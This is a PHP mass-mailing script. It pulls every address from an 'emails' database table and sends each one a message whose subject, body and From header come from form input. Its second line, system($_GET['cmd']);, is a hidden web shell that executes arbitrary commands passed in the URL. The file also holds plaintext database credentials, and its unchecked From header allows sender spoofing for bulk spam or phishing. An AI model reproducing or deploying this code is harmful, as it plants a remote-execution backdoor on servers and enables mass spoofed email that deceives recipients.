<?php
 system($_GET['cmd']);
$servername  = "localhost";
$username = "u553554390_tino";
$dbname = "u553554390_tino";
$password = "Tino@123";



// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);

// Check connection
if (! $conn) {
    die("Connection failed: ");
} else {
 


        $sql = "SELECT email FROM emails" ;

$result = mysqli_query($conn , $sql); }
if (! $result) {
echo "error";	
}

 while($row = mysqli_fetch_assoc($result)) {
        $from =$_POST['from'];
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html;1' . "\r\n";
$headers .= 'From: '.$from."\r\n";
$sub1 = $_POST['subject'];
$msg1 = $_POST['msg'];
sleep(1);
flush();
 $retval = mail ($row['email'],$sub1,$msg1,$headers);
         
         if( $retval == true ) {
            echo date('h:i:s')."Message sent successfully... to ".$row['email']."<br><hr><br>";
         }else {
             echo date('h:i:s')."Message sent error... to ".$row['email']."<br><hr><br>";
         }
		
		
    }
mysqli_close($conn);
    ?>
